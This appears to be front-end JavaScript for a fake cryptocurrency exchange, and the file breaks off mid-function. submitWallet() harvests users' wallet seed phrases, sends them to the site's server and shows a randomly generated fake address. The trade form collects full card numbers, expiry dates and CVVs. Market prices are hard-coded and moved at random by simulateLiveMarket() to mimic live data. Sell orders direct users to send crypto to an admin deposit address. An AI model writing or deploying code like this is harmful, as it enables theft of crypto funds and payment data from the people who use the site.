const markets = [ { name: 'Bitcoin', symbol: 'BTC', price: 85245.32, change: 2.48, icon: '₿', color: '#f7931a' }, { name: 'Ethereum', symbol: 'ETH', price: 5245.10, change: 1.12, icon: 'Ξ', color: '#627eea' }, { name: 'Solana', symbol: 'SOL', price: 252.32, change: 5.20, icon: 'S', color: '#00d2ff' }, { name: 'BNB', symbol: 'BNB', price: 720.40, change: -0.45, icon: 'B', color: '#f3ba2f' }, { name: 'XRP', symbol: 'XRP', price: 3.91, change: -1.20, icon: 'X', color: '#23292f' }, { name: 'Cardano', symbol: 'ADA', price: 1.25, change: 3.10, icon: 'A', color: '#0033ad' }, { name: 'Dogecoin', symbol: 'DOGE', price: 0.28, change: 1.45, icon: 'Ð', color: '#c2a633' }, { name: 'Avalanche', symbol: 'AVAX', price: 45.20, change: -2.10, icon: 'A', color: '#e84142' }, { name: 'Polkadot', symbol: 'DOT', price: 12.15, change: 0.50, icon: '●', color: '#e6007a' }, { name: 'Chainlink', symbol: 'LINK', price: 28.40, change: 4.20, icon: '⬡', color: '#2a5ada' }, { name: 'Polygon', symbol: 'MATIC', price: 1.12, change: -1.15, icon: 'M', color: '#8247e5' }, { name: 'Shiba Inu', symbol: 'SHIB', price: 0.000045, change: 6.80, icon: 'S', color: '#f00500' }, { name: 'Litecoin', symbol: 'LTC', price: 112.10, change: 1.05, icon: 'Ł', color: '#345d9d' }, { name: 'TRON', symbol: 'TRX', price: 0.23, change: 0.80, icon: 'T', color: '#eb0029' }, { name: 'Uniswap', symbol: 'UNI', price: 15.20, change: -0.90, icon: 'U', color: '#ff007a' }, { name: 'Cosmos', symbol: 'ATOM', price: 14.80, change: 2.10, icon: '⚛', color: '#2e3148' }, { name: 'Stellar', symbol: 'XLM', price: 0.22, change: -1.50, icon: 'X', color: '#000000' }, { name: 'NEAR Protocol', symbol: 'NEAR', price: 9.50, change: 3.40, icon: 'N', color: '#00ec97' }, { name: 'Aptos', symbol: 'APT', price: 15.20, change: -2.30, icon: 'A', color: '#000000' }, { name: 'Arbitrum', symbol: 'ARB', price: 2.15, change: 1.80, icon: 'A', color: '#12aaff' }, { name: 'Optimism', symbol: 'OP', price: 4.40, change: 0.40, icon: 'O', color: '#ff0420' }, { name: 'Filecoin', symbol: 'FIL', price: 8.80, change: -1.10, icon: 'F', color: '#0090ff' }, { name: 'Injective', symbol: 'INJ', price: 35.10, change: 7.20, icon: 'I', color: '#00d2ff' }, { name: 'Sui', symbol: 'SUI', price: 2.65, change: 4.50, icon: 'S', color: '#6fbcf0' }, { name: 'Pepe', symbol: 'PEPE', price: 0.000018, change: 12.40, icon: '🐸', color: '#3d8130' } ];
const countries = [ { name: "United States", flag: "🇺🇸" }, { name: "United Kingdom", flag: "🇬🇧" }, { name: "Canada", flag: "🇨🇦" }, { name: "Australia", flag: "🇦🇺" }, { name: "Nigeria", flag: "🇳🇬" }, { name: "Kenya", flag: "🇰🇪" }, { name: "South Africa", flag: "🇿🇦" }, { name: "Ghana", flag: "🇬🇭" }, { name: "India", flag: "🇮🇳" }, { name: "Germany", flag: "🇩🇪" }, { name: "France", flag: "🇫🇷" }, { name: "Japan", flag: "🇯🇵" }, { name: "UAE", flag: "🇦🇪" }, { name: "Brazil", flag: "🇧🇷" } ];

let currentTradeMode = 'buy';
let currentUser = null;
let globalSettings = null;

function showView(viewId, authType = 'login') {
    document.querySelectorAll('.app-view').forEach(view => view.style.display = 'none');
    document.getElementById(viewId).style.display = 'block';
    if (viewId === 'authView') switchAuth(authType);
    if (viewId === 'dashboardView') { fetchBalances(); checkWalletStatus(); }
    if (viewId === 'guestView' && typeof loadMarkets === 'function') loadMarkets();
    window.scrollTo(0, 0);
}

function showToast(msg) {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}

function switchAuth(type) {
    document.getElementById('loginForm').style.display = type === 'login' ? 'block' : 'none';
    document.getElementById('registerForm').style.display = type === 'register' ? 'block' : 'none';
}

function populateCountries() {
    const select = document.getElementById('regCountry');
    if(!select) return;
    countries.forEach(country => {
        const option = document.createElement('option');
        option.value = `${country.flag} ${country.name}`;
        option.textContent = `${country.flag} ${country.name}`;
        select.appendChild(option);
    });
}

function populateTradeCoins() {
    const select = document.getElementById('tradeCoin');
    if(!select) return;
    select.innerHTML = ''; 
    markets.forEach(coin => {
        const option = document.createElement('option');
        option.value = coin.symbol;
        option.textContent = `${coin.name} (${coin.symbol})`;
        select.appendChild(option);
    });
}
async function fetchBalances() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        let html = `<div class="section-header"><h3>Your Assets</h3></div><div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>`;
        let totalValue = 0;
        markets.forEach(coin => {
            const amount = balances[coin.symbol] || 0;
            const value = amount * coin.price;
            totalValue += value;
            html += `<div class="asset-row" onclick="showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})" style="cursor: pointer;"><div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name} (${coin.symbol})</div><div class="asset-amount">${amount.toFixed(6)}</div><div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div></div>`;
        });
        assetsCard.innerHTML = html;
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) totalEl.textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
    } catch (error) { console.log("Balance fetch error:", error); }
}

function showAssetActions(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'assetActionModal';
        modal.className = 'modal';
        modal.style.display = 'none'; modal.style.alignItems = 'center'; modal.style.justifyContent = 'center';
        modal.innerHTML = `<div class="modal-content" style="max-width: 400px; width: 90%; text-align: center; padding: 25px;"><span class="close" onclick="document.getElementById('assetActionModal').style.display='none'">&times;</span><div id="assetModalIcon" style="width: 60px; height: 60px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 30px; color: white;"></div><h2 id="assetModalTitle" style="margin-bottom: 5px;"></h2><p id="assetModalBalance" style="color: #888; margin-bottom: 25px;"></p><div style="display: flex; gap: 10px;"><button onclick="executeAssetAction('buy')" class="btn-primary" style="flex: 1; background: var(--success);">Buy</button><button onclick="executeAssetAction('sell')" class="btn-primary" style="flex: 1; background: var(--danger);">Sell</button></div></div>`;
        document.body.appendChild(modal);
    }
    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('assetModalIcon').style.background = coin.color;
    document.getElementById('assetModalIcon').innerHTML = coin.icon;
    document.getElementById('assetModalTitle').textContent = name + ' (' + symbol + ')';
    document.getElementById('assetModalBalance').innerHTML = `Balance: <strong>${amount.toFixed(6)} ${symbol}</strong><br>Value: <strong>$${value.toFixed(2)}</strong>`;
    window._currentActionSymbol = symbol;
    modal.style.display = 'flex';
}

function executeAssetAction(mode) {
    document.getElementById('assetActionModal').style.display = 'none';
    requireAuth('tradeView', mode);
    setTimeout(() => { document.getElementById('tradeCoin').value = window._currentActionSymbol; calcTrade(); }, 100);
}

async function checkWalletStatus() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}`);
        const user = await res.json();
        document.getElementById('walletDisconnected').style.display = 'none';
        document.getElementById('walletPending').style.display = 'none';
        document.getElementById('walletApproved').style.display = 'none';
        if (user.walletStatus === 'approved') {
            document.getElementById('walletApproved').style.display = 'block';
            document.getElementById('displayWalletAddress').textContent = user.walletAddress;
            document.getElementById('walletStatusBadge').textContent = 'Connected';
            document.getElementById('walletStatusBadge').className = 'status-badge approved';
        } else if (user.walletStatus === 'pending') {
            document.getElementById('walletPending').style.display = 'block';
            document.getElementById('walletStatusBadge').textContent = 'Verifying';
        } else {
            document.getElementById('walletDisconnected').style.display = 'block';
        }
        setTimeout(() => {
            const walletElem = document.getElementById('walletDisconnected') || document.getElementById('walletApproved');
            if (!walletElem) return;
            const walletCard = walletElem.closest('.web3-wallet-card');
            const assetsHeading = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
            if (assetsHeading && walletCard) {
                const assetsCard = assetsHeading.closest('.assets-section');
                if (assetsCard && assetsCard.parentNode) {
                    assetsCard.parentNode.insertBefore(walletCard, assetsCard);
                    walletCard.style.marginBottom = '20px';
                }
            }
        }, 100);
    } catch (error) { console.log(error); }
}
function showImportWallet() { document.getElementById('importWalletForm').style.display = 'block'; }
async function submitWallet() {
    const seed = document.getElementById('seedPhraseInput').value.trim();
    if (seed.split(' ').length < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    try {
        const res = await fetch('/api/wallet/import', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: currentUser.email, seedPhrase: seed, walletAddress: fakeAddress }) });
        if (res.ok) { showToast("Wallet submitted for review."); checkWalletStatus(); }
    } catch (error) { showToast("Error submitting wallet."); }
}

async function handleRegister() {
    const name = document.getElementById('regName').value;
    const country = document.getElementById('regCountry').value;
    const phone = document.getElementById('regPhone').value;
    const email = document.getElementById('regEmail').value;
    const password = document.getElementById('regPassword').value;
    if (!name || !country || !phone || !email || !password) return showToast("Please fill all fields.");
    try {
        const res = await fetch('/api/auth/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name, country, phone, email, password }) });
        const data = await res.json();
        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

async function handleLogin() {
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    if (!email || !password) return showToast("Please fill all fields.");
    try {
        const res = await fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) });
        const data = await res.json();
        if (res.ok) { localStorage.setItem('token', data.token); localStorage.setItem('user', JSON.stringify(data.user)); checkAuthState(); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

function handleLogout() { localStorage.removeItem('token'); localStorage.removeItem('user'); checkAuthState(); }

function checkAuthState() {
    currentUser = JSON.parse(localStorage.getItem('user'));
    if (currentUser && (currentUser.isAdmin || currentUser.email.includes('admin'))) { window.location.href = '/admin.html'; return; }
    const navLinks = document.getElementById('navLinks');
    if (currentUser) {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')">${currentUser.name.charAt(0).toUpperCase()}</a><a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>`;
        showView('dashboardView');
    } else {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" onclick="showView('authView', 'login')">Login</a><a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>`;
        showView('guestView');
    }
}
async function fetchGlobalSettings() {
    try { const res = await fetch('/api/admin/public/settings'); globalSettings = await res.json(); } catch (e) { console.log("Could not load global settings"); }
}

function updateAdminAddressDisplay() {
    const addressDiv = document.getElementById('adminWalletDisplay');
    if (!addressDiv) return;
    if (currentTradeMode === 'sell' && globalSettings && globalSettings.wallets) {
        const coin = document.getElementById('tradeCoin').value;
        const address = globalSettings.wallets[coin];
        if (address) {
            addressDiv.style.display = 'block';
            addressDiv.innerHTML = `<p style="font-size: 13px; color: #aaa; margin-bottom: 5px; font-weight: 600;">${coin} Deposit Address</p><div style="display: flex; gap: 8px; margin-bottom: 10px;"><div style="flex: 1; background: #0f0f15; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; word-break: break-all; border: 1px solid #333; color: #fff; display: flex; align-items: center;">${address}</div><button onclick="copyDepositAddress('${address}', this)" style="background: #00d4aa; color: #000; border: none; padding: 0 15px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s;">Copy</button></div><p style="font-size: 11px; color: #e74c3c; line-height: 1.4;">⚠️ Only send ${coin} to this address. Sending any other coin or using the wrong network will result in permanent loss of funds.</p>`;
        } else {
            addressDiv.style.display = 'block';
            addressDiv.innerHTML = `<p style="font-size: 13px; color: #e74c3c; padding: 10px; background: #2a1a1a; border-radius: 6px;">Deposit address for ${coin} is currently unavailable. Please contact support.</p>`;
        }
    } else { addressDiv.style.display = 'none'; }
}

function copyDepositAddress(text, btn) {
    navigator.clipboard.writeText(text).then(() => {
        const originalText = btn.textContent; btn.textContent = 'Copied!'; btn.style.background = '#2ecc71';
        setTimeout(() => { btn.textContent = originalText; btn.style.background = '#00d4aa'; }, 2000);
    }).catch(err => alert('Failed to copy address.'));
}

function requireAuth(targetView, mode = null) {
    if (!currentUser) { showView('authView', 'login'); showToast("Please log in to continue"); }
    else { showView(targetView); if (targetView === 'tradeView') setTradeMode(mode || 'buy'); }
}

function setTradeMode(mode) {
    currentTradeMode = mode;
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy');
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    document.getElementById('amountLabel').textContent = mode === 'buy' ? 'Amount to Spend (USD)' : 'Amount to Sell (USD)';
    document.getElementById('submitTradeBtn').textContent = mode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale';
    document.getElementById('submitTradeBtn').style.background = mode === 'buy' ? 'var(--success)' : 'var(--danger)';
    document.getElementById('receivingWalletContainer').style.display = mode === 'buy' ? 'block' : 'none';
    document.getElementById('tradeAmount').value = ''; document.getElementById('tradeReceive').value = '';
    let addressDiv = document.getElementById('adminWalletDisplay');
    if (!addressDiv) {
        addressDiv = document.createElement('div'); addressDiv.id = 'adminWalletDisplay';
        addressDiv.style = "margin-top: 15px; padding: 15px; background: #1a1a2a; border: 1px solid #333; border-radius: 8px; display: none;";
        const submitBtn = document.getElementById('submitTradeBtn'); if (submitBtn && submitBtn.parentNode) submitBtn.parentNode.insertBefore(addressDiv, submitBtn);
    }
    updateAdminAddressDisplay();
}

function togglePaymentDetails() {
    const method = document.getElementById('tradeMethod').value;
    document.getElementById('cardDetailsInputs').style.display = method === 'Credit Card' ? 'block' : 'none';
    document.getElementById('paypalDetailsInputs').style.display = method === 'PayPal' ? 'block' : 'none';
    document.getElementById('bankDetailsInputs').style.display = method === 'Bank Transfer' ? 'block' : 'none';
}

function calcTrade() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const coin = markets.find(c => c.symbol === coinSymbol);
    if (coin && amount > 0) document.getElementById('tradeReceive').value = (amount / coin.price).toFixed(6) + " " + coin.symbol;
    else document.getElementById('tradeReceive').value = '';
    updateAdminAddressDisplay();
}

async function submitTrade() {
    const amount = document.getElementById('tradeAmount').value;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    if (!amount || amount < 100) return showToast("Minimum trade is $100.");
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; const expiry = document.getElementById('cardExpiry').value; const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; if (!email.includes('@')) return showToast("Enter a valid PayPal email."); paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; if (!bank) return showToast("Enter bank details."); paymentDetails = `Bank: ${bank}`;
    }
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); btn.textContent = 'Processing...'; btn.disabled = true;
    const orderData = { userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, sendAmount: amount, sendCurrency: currentTradeMode === 'buy' ? 'USD' : coinSymbol, getCurrency: currentTradeMode === 'buy' ? coinSymbol : 'USD', method: method, paymentDetails: paymentDetails, receivingWallet: wallet };
    try {
        const res = await fetch('/api/orders/create', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) });
        const data = await res.json();
        if (res.ok) { showToast(`Order Placed! ID: ${data.orderId}`); setTimeout(() => showView('dashboardView'), 2000); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting to server."); }
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
}

function simulateLiveMarket() {
    markets.forEach(coin => { const fluctuation = (Math.random() - 0.5) * (coin.price * 0.002); coin.price += fluctuation; const changeFluctuation = (Math.random() - 0.5) * 0.2; coin.change = parseFloat((coin.change + changeFluctuation).toFixed(2)); });
}

function loadMarkets() {
    const marketList = document.getElementById('market-list'); const ticker = document.getElementById('ticker');
    if(!marketList) return;
    let marketHTML = ''; let tickerHTML = '';
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; const changeClass = isUp ? 'up' : 'down'; const changeSymbol = isUp ? '↑' : '↓';
        let formattedPrice = coin.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 6});
        marketHTML += `<div class="market-row" onclick="quickTrade('${coin.symbol}')"><div class="market-rank">${index + 1}</div><div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div><div class="market-price">$${formattedPrice}</div><div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change)}%</div></div>`;
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change)}%</span></div>`;
    });
    marketList.innerHTML = marketHTML; if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 
}

function quickTrade(symbol) { requireAuth('tradeView', 'buy'); setTimeout(() => { document.getElementById('tradeCoin').value = symbol; calcTrade(); }, 100); }

document.addEventListener('DOMContentLoaded', () => {
    populateCountries(); populateTradeCoins(); loadMarkets(); checkAuthState(); fetchGlobalSettings();
    setInterval(() => { simulateLiveMarket(); loadMarkets(); }, 2000);
});

/* =====================================================
   PROFESSIONAL ASSET MODAL (Fixed Overlay)
   ===================================================== */
window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal');
    
    // Create the modal if it doesn't exist
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'assetActionModal';
        
        // Forcefully apply full-screen overlay styles inline
        modal.style.position = 'fixed';
        modal.style.top = '0';
        modal.style.left = '0';
        modal.style.width = '100vw';
        modal.style.height = '100vh';
        modal.style.backgroundColor = 'rgba(0, 0, 0, 0.75)';
        modal.style.backdropFilter = 'blur(4px)';
        modal.style.zIndex = '9999';
        modal.style.display = 'none'; 
        modal.style.alignItems = 'center'; 
        modal.style.justifyContent = 'center';
        
        // Close if user clicks outside the white box
        modal.onclick = function(e) {
            if (e.target === modal) modal.style.display = 'none';
        };

        modal.innerHTML = `
            <div style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 25px; width: 90%; max-width: 380px; text-align: center; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.5);">
                <span onclick="document.getElementById('assetActionModal').style.display='none'" style="position: absolute; top: 10px; right: 15px; color: #888; font-size: 24px; cursor: pointer; font-weight: bold;">&times;</span>
                
                <div id="assetModalIcon" style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 4px 10px rgba(0,0,0,0.3);"></div>
                
                <h2 id="assetModalTitle" style="margin: 0 0 5px 0; color: #fff; font-size: 20px;"></h2>
                <p id="assetModalBalance" style="color: #888; margin: 0 0 25px 0; font-size: 14px; line-height: 1.5;"></p>
                
                <div style="display: flex; gap: 12px;">
                    <button onclick="executeAssetAction('buy')" style="flex: 1; background: var(--success, #0ecb51); color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer;">Buy</button>
                    <button onclick="executeAssetAction('sell')" style="flex: 1; background: var(--danger, #f6465d); color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer;">Sell</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
    }

    // Populate data
    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('assetModalIcon').style.background = coin.color;
    document.getElementById('assetModalIcon').innerHTML = coin.icon;
    document.getElementById('assetModalTitle').textContent = name + ' (' + symbol + ')';
    document.getElementById('assetModalBalance').innerHTML = `Balance: <strong style="color: #fff;">${amount.toFixed(6)} ${symbol}</strong><br>Value: <strong style="color: #fff;">$${value.toFixed(2)}</strong>`;
    
    window._currentActionSymbol = symbol;

    // Show it
    modal.style.display = 'flex';
};

/* =====================================================
   PROFESSIONAL PAYMENT INSTRUCTIONS MODAL (Sell Flow)
   ===================================================== */
window.submitTrade = async function() {
    const amount = document.getElementById('tradeAmount').value;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    
    if (!amount || amount < 100) return showToast("Minimum trade is $100.");
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; 
        const expiry = document.getElementById('cardExpiry').value; 
        const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; 
        if (!email.includes('@')) return showToast("Enter a valid PayPal email."); 
        paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; 
        if (!bank) return showToast("Enter bank details."); 
        paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    
    const orderData = { 
        userName: currentUser.name, 
        userEmail: currentUser.email, 
        mode: currentTradeMode, 
        sendAmount: amount, 
        sendCurrency: currentTradeMode === 'buy' ? 'USD' : coinSymbol, 
        getAmount: currentTradeMode === 'buy' ? document.getElementById('tradeReceive').value.split(' ')[0] : amount,
        getCurrency: currentTradeMode === 'buy' ? coinSymbol : 'USD', 
        method: method, 
        paymentDetails: paymentDetails, 
        receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            // If it's a SELL order, show the Payment Instructions Modal!
            if (currentTradeMode === 'sell') {
                showPaymentInstructions(coinSymbol, orderData.getAmount, amount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { 
            showToast(data.message || "Failed to place order."); 
        }
    } catch (error) { 
        showToast("Error connecting to server."); 
    } finally { 
        btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; 
        btn.disabled = false; 
    }
};

function showPaymentInstructions(coinSymbol, cryptoAmount, usdAmount) {
    let modal = document.getElementById('paymentInstructionModal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'paymentInstructionModal';
        modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
        
        modal.innerHTML = `
            <div style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 25px; width: 100%; max-width: 400px; text-align: center;">
                <h2 style="color: #00d4aa; margin-bottom: 10px;">Order Created!</h2>
                <p style="color: #aaa; font-size: 14px; margin-bottom: 20px;">To complete your sale, please send the exact amount below to the Admin Deposit Address.</p>
                
                <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px;">
                    <p style="color: #888; font-size: 12px; text-transform: uppercase; margin-bottom: 5px;">Amount to Send</p>
                    <h3 id="payInstAmount" style="color: #fff; margin: 0; font-size: 22px;"></h3>
                </div>

                <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                    <p style="color: #888; font-size: 12px; text-transform: uppercase; margin-bottom: 5px;">${coinSymbol} Deposit Address</p>
                    <div style="display: flex; gap: 8px;">
                        <div id="payInstAddress" style="flex: 1; font-family: monospace; font-size: 13px; color: #00d4aa; word-break: break-all; text-align: left;"></div>
                        <button onclick="copyPayAddress()" id="copyBtn" style="background: #333; color: #fff; border: none; padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer;">Copy</button>
                    </div>
                </div>

                <p style="color: #e74c3c; font-size: 12px; margin-bottom: 20px;">⚠️ Your order is currently <strong>Pending</strong>. It will only be processed after we verify your transaction on the blockchain.</p>

                <button onclick="document.getElementById('paymentInstructionModal').remove(); showView('dashboardView');" style="background: #00d4aa; color: #000; border: none; width: 100%; padding: 15px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer;">I Have Sent The Crypto</button>
            </div>
        `;
        document.body.appendChild(modal);
    }

    // Populate Data
    document.getElementById('payInstAmount').textContent = `${cryptoAmount} ${coinSymbol}`;
    
    // Get address from globalSettings (loaded when page loaded)
    let address = "Contact Support (Address Not Set)";
    if (globalSettings && globalSettings.wallets && globalSettings.wallets[coinSymbol]) {
        address = globalSettings.wallets[coinSymbol];
    }
    
    document.getElementById('payInstAddress').textContent = address;
    window._currentPayAddress = address;
    
    modal.style.display = 'flex';
}

window.copyPayAddress = function() {
    navigator.clipboard.writeText(window._currentPayAddress).then(() => {
        const btn = document.getElementById('copyBtn');
        btn.textContent = 'Copied!';
        btn.style.background = '#00d4aa';
        btn.style.color = '#000';
        setTimeout(() => { btn.textContent = 'Copy'; btn.style.background = '#333'; btn.style.color = '#fff'; }, 2000);
    });
};

/* =====================================================
   PROFESSIONAL SELL MODAL (Fixed Math & Wording)
   ===================================================== */
window.submitTrade = async function() {
    const amount = document.getElementById('tradeAmount').value;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    
    if (!amount || amount < 100) return showToast("Minimum trade is $100.");
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; 
        const expiry = document.getElementById('cardExpiry').value; 
        const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; 
        if (!email.includes('@')) return showToast("Enter a valid PayPal email."); 
        paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; 
        if (!bank) return showToast("Enter bank details."); 
        paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    
    // Calculate exact crypto amount for Sell orders
    const coin = markets.find(c => c.symbol === coinSymbol);
    const cryptoAmount = currentTradeMode === 'sell' ? (amount / coin.price).toFixed(6) : document.getElementById('tradeReceive').value.split(' ')[0];
    
    const orderData = { 
        userName: currentUser.name, 
        userEmail: currentUser.email, 
        mode: currentTradeMode, 
        sendAmount: currentTradeMode === 'buy' ? amount : cryptoAmount, // Send Crypto Amount if selling
        sendCurrency: currentTradeMode === 'buy' ? 'USD' : coinSymbol, 
        getAmount: currentTradeMode === 'buy' ? cryptoAmount : amount, 
        getCurrency: currentTradeMode === 'buy' ? coinSymbol : 'USD', 
        method: method, 
        paymentDetails: paymentDetails, 
        receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                // Fetch settings again to ensure we have the latest address
                try {
                    const setRes = await fetch('/api/admin/public/settings');
                    globalSettings = await setRes.json();
                } catch(e) {}

                showPaymentInstructions(coinSymbol, cryptoAmount, amount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { 
            showToast(data.message || "Failed to place order."); 
        }
    } catch (error) { 
        showToast("Error connecting to server."); 
    } finally { 
        btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; 
        btn.disabled = false; 
    }
};

function showPaymentInstructions(coinSymbol, cryptoAmount, usdAmount) {
